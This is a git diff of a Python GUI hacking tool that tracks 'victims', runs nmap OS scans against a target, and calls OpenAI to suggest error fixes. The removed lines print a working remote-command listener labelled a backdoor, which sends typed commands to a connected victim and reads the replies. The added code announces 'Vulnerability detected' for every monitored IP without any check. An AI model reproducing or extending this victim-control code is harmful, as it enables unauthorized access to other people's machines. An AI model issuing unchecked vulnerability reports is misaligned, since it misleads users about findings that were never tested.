@@ -8,9 +8,9 @@ import requests
 import openai
 import os
 import sys
-import asyncio
 from PySide6.QtWidgets import QApplication, QMainWindow, QTextEdit, QPushButton, QVBoxLayout, QWidget, QTabWidget, QLineEdit
 from PySide6 import QtCore
+import asyncio
 
 # ===================== Logging Setup ===================== #
 if not os.path.exists('logs'):
@@ -21,10 +21,9 @@ log_handler = RotatingFileHandler(log_file, maxBytes=1024 * 1024, backupCount=5)
 logging.basicConfig(handlers=[log_handler], level=logging.INFO,
                     format='%(asctime)s - %(levelname)s - %(message)s')
 
-# Constants for Setup
+# Constants for Network Scanning and AI
 LHOST = "localhost"
 RHOST = "target_ip"
-PROXY = "proxy_ip:proxy_port"
 NMAP_ARGS = "-Pn -sT -O"
 
 # API Credentials from config file
@@ -34,19 +33,29 @@ with open('config/api_credentials.json', 'r') as cred_file:
 # Initialize OpenAI API
 openai.api_key = api_credentials["openai_api_key"]
 
-# ===================== Error Handling ===================== #
-def handle_exception(exception, output_area=None):
-    """Log and handle exceptions."""
-    error_message = str(exception)
-    logging.error(error_message)
-    if output_area:
-        output_area.append(f"Error: {error_message}")
+# ===================== AI Error Handling ===================== #
+def detect_and_fix_errors(error_message, output_area):
+    """Use OpenAI to suggest fixes for detected errors."""
+    try:
+        response = openai.Completion.create(
+            model="text-davinci-003",
+            prompt=f"Error detected: {error_message}. Suggest a fix.",
+            max_tokens=150
+        )
+        suggestion = response.choices[0].text.strip()
+        output_area.append(f"AI Suggestion: {suggestion}")
+    except openai.error.OpenAIError as e:
+        output_area.append(f"OpenAI Error: {str(e)}")
+        logging.error(f"OpenAI error: {str(e)}")
+    except Exception as e:
+        output_area.append(f"Unhandled error in AI detection: {str(e)}")
+        logging.error(f"AI detection error: {str(e)}")
 
 # ===================== Victim Monitoring ===================== #
 victims = []
 
 def add_victim(ip_address, output_area):
-    """Monitor victim."""
+    """Monitor victim and notify via AI suggestion on vulnerability."""
     if not validate_ip(ip_address):
         output_area.append(f"Invalid IP address: {ip_address}\n")
         logging.error(f"Attempted to monitor invalid IP address: {ip_address}")
@@ -54,6 +63,9 @@ def add_victim(ip_address, output_area):
 
     victims.append(ip_address)
     output_area.append(f"Monitoring victim: {ip_address}\n")
+    
+    message = f"Vulnerability detected at {ip_address}."
+    output_area.append(message)
 
 def validate_ip(ip):
     """Validate if the given string is a valid IP address."""
@@ -61,7 +73,7 @@ def validate_ip(ip):
     ip_pattern = r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$"
     return re.match(ip_pattern, ip) is not None
 
-# ===================== Scanning and Backdoor ===================== #
+# ===================== Scanning ===================== #
 def scan_target(rhost, output_area):
     """Scan target using Nmap."""
     try:
@@ -70,28 +82,16 @@ def scan_target(rhost, output_area):
         result = f"Target OS: {nm[rhost]['osclass'][0]['osfamily']}\n{nm.csv()}"
         output_area.append(result)
     except Exception as e:
-        handle_exception(e)
+        handle_exception(e, output_area)
 
-def create_backdoor(lhost, port=8080, output_area=None, stop_event=None):
-    """Create a backdoor."""
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.bind((lhost, port))
-        sock.listen(1)
-        output_area.append(f"Listening on {lhost}:{port}...\n")
-        conn, addr = sock.accept()
-        output_area.append(f"Connection established with {addr}\n")
-
-        while not stop_event.is_set():
-            cmd, ok = QLineEdit.getText(None, "Command Input", "Enter command:")
-            if not ok or cmd.lower() in ['exit', 'quit']:
-                break
-            conn.sendall(cmd.encode())
-            response = conn.recv(4096).decode()
-            output_area.append(response + '\n')
-        conn.close()
-    except Exception as e:
-        handle_exception(e)
+# ===================== Error Handling ===================== #
+def handle_exception(exception, output_area=None):
+    """Log and handle exceptions."""
+    error_message = str(exception)
+    logging.error(error_message)
+    if output_area:
+        output_area.append(f"Error: {error_message}")
+        detect_and_fix_errors(error_message, output_area)
 
 # ===================== GUI Application ===================== #
 class MultiToolV4(QMainWindow):
@@ -100,7 +100,6 @@ class MultiToolV4(QMainWindow):
     def __init__(self):
         super().__init__()
         self.init_ui()
-        self.stop_event = threading.Event()
 
     def init_ui(self):
         self.setWindowTitle('MultiToolV4 by kdairatchi')
@@ -142,13 +141,6 @@ class MultiToolV4(QMainWindow):
         layout = QVBoxLayout(error_handling_tab)
         layout.addWidget(self.error_output)
         self.tabs.addTab(error_handling_tab, "Error Handling")
-
-    def start_backdoor_thread(self):
-        self.stop_event.clear()
-        threading.Thread(target=create_backdoor, args=(LHOST, 8080, self.error_output, self.stop_event), daemon=True).start()
-
-    def stop_backdoor_thread(self):
-        self.stop_event.set()
 
 # Main function to start the GUI application
 def main():
